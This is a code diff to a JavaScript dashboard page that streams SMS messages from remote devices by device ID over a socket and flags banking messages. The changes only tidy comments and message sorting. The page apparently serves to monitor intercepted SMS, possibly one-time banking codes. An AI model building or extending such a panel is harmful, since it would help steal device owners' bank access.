@@ -3002,8 +3002,6 @@ function showNoDataMessage() {
   `;
 }
 
-// ===================== SOCKET INIT WITH TOKEN =====================
-// ===================== SOCKET INIT WITH TOKEN =====================
 function initSocket() {
   try {
     const socketOptions = {
@@ -3011,7 +3009,6 @@ function initSocket() {
       withCredentials: true
     };
     
-    // Add token to socket connection
     if (AUTH_TOKEN) {
       socketOptions.auth = {
         token: AUTH_TOKEN
@@ -3022,7 +3019,6 @@ function initSocket() {
         deviceId: DEVICE_ID
       };
     }
-    
     socket = io(API_BASE, socketOptions);
 
     socket.on("connect", () => {
@@ -3034,15 +3030,12 @@ function initSocket() {
       });
     });
 
-    // ✅ FIXED: Updated smsLogUpdate handler to parse data properly
     socket.on("smsLogUpdate", (data) => {
       console.log('🔔 Details page smsLogUpdate EVENT:', data);
       
-      // Check if data exists and belongs to this device
       if (data && data.uid === DEVICE_ID) {
         console.log('📩 Processing SMS for this device');
         
-        // Handle different data structures
         let smsData = data.data || data;
         
         if (smsData) {
@@ -3056,12 +3049,10 @@ function initSocket() {
       }
     });
 
-    // ✅ FIXED: Direct SMS event handler
     socket.on("sms", (data) => {
-      console.log('🔔 Details page direct SMS EVENT:', data);
+      console.log(' Details page direct SMS EVENT:', data);
       
       if (data) {
-        // Check if SMS belongs to current device
         const deviceId = data.uniqueid || data.deviceId || data.uid;
         
         if (deviceId === DEVICE_ID) {
@@ -3230,13 +3221,12 @@ async function loadDeviceMessages() {
       
       console.log('📱 Device Messages:', deviceMessages.length);
       
-      deviceMessages.sort((a, b) => {
+      // ✅ FIXED: Always sort by timestamp (latest first)
+      allSmsData = deviceMessages.sort((a, b) => {
         const timeA = getTimestampFromSms(a);
         const timeB = getTimestampFromSms(b);
         return timeB - timeA; // Descending order (newest first)
       });
-      
-      allSmsData = deviceMessages;
       
       renderAllMessagesSorted();
       
@@ -3269,7 +3259,7 @@ function getTimestampFromSms(sms) {
   return Date.now();
 }
 
-// ✅ NEW FUNCTION: Render all messages in sorted order
+// ✅ NEW FUNCTION: Render all messages in sorted order (FIXED)
 function renderAllMessagesSorted() {
   // Clear current messages
   deviceMessagesList.innerHTML = '';
@@ -3277,11 +3267,11 @@ function renderAllMessagesSorted() {
   // Hide loading message if present
   if (loadingMessages) loadingMessages.style.display = 'none';
   
-  // Sort all messages by timestamp (newest first)
+  // ✅ FIXED: Always sort by timestamp before rendering
   const sortedMessages = [...allSmsData].sort((a, b) => {
     const timeA = getTimestampFromSms(a);
     const timeB = getTimestampFromSms(b);
-    return timeB - timeA; // Descending order
+    return timeB - timeA; // Descending order (newest first)
   });
   
   // Render all messages in sorted order
@@ -3412,7 +3402,8 @@ function addMessageCard(message) {
     });
   }
   
-  container.appendChild(card);
+  // ✅ FIXED: Prepend new message at the top
+  container.prepend(card);
 }
 
 function isBankingMessage(text) {
@@ -4029,7 +4020,6 @@ function updatePopupFromReply(data, message) {
   }
 }
 
-// ===================== HISTORY FUNCTIONS WITH AUTH =====================
 async function loadInitialHistory() {
   try {
     const response = await fetchWithAuth(HISTORY_API);
@@ -4210,7 +4200,6 @@ function renderHistory() {
 function handleLiveSMS(data) {
   console.log('🔔 Details page received live SMS:', data);
   
-  // Extract SMS data from different possible structures
   let smsData = data.data || data;
   
   if (!smsData || (!smsData.body && !smsData.message && !smsData.content)) {
@@ -4218,7 +4207,6 @@ function handleLiveSMS(data) {
     return;
   }
   
-  // Check if this SMS belongs to current device
   const deviceId = data.uid || smsData.uniqueid || smsData.deviceId || smsData.uid;
   if (deviceId !== DEVICE_ID) return;
   
@@ -4231,7 +4219,6 @@ function handleLiveSMS(data) {
   
   processedLiveSmsIds.add(smsId);
   
-  // Extract message body from different possible fields
   let messageBody = '';
   if (smsData.body) messageBody = smsData.body;
   else if (smsData.message) messageBody = smsData.message;
@@ -4240,7 +4227,6 @@ function handleLiveSMS(data) {
   else if (smsData.body_preview) messageBody = smsData.body_preview;
   else if (typeof smsData === 'string') messageBody = smsData;
   
-  // Extract sender from different possible fields
   let sender = smsData.sender || smsData.senderNumber || smsData.from || 'Unknown';
   let receiver = smsData.receiver || smsData.receiverNumber || smsData.to || 'Unknown';
   
@@ -4263,17 +4249,17 @@ function handleLiveSMS(data) {
     receiverNumber: receiver,
     uniqueid: DEVICE_ID
   };
-  
-  // ✅ FIX: Add to array and sort by timestamp (newest first)
+
   const exists = allSmsData.some(sms => sms.id === smsId);
   if (!exists) {
-    allSmsData.unshift(newSms); // Add to beginning
+    // ✅ FIXED: Insert at beginning of array (top position)
+    allSmsData.unshift(newSms); 
     
-    // ✅ FIX: Sort all messages by timestamp (newest first)
+    // ✅ FIXED: Maintain sorting by timestamp
     allSmsData.sort((a, b) => {
       const timeA = getTimestampFromSms(a);
       const timeB = getTimestampFromSms(b);
-      return timeB - timeA;
+      return timeB - timeA; // Descending order (newest first)
     });
     
     liveSmsCount++;
@@ -4281,6 +4267,7 @@ function handleLiveSMS(data) {
   
   updateNotificationBadge(liveSmsCount);
 
+  // ✅ FIXED: Re-render all messages with proper sorting
   renderAllMessagesSorted();
   
   showToast(`📩 New SMS from ${sender}`, 'live');
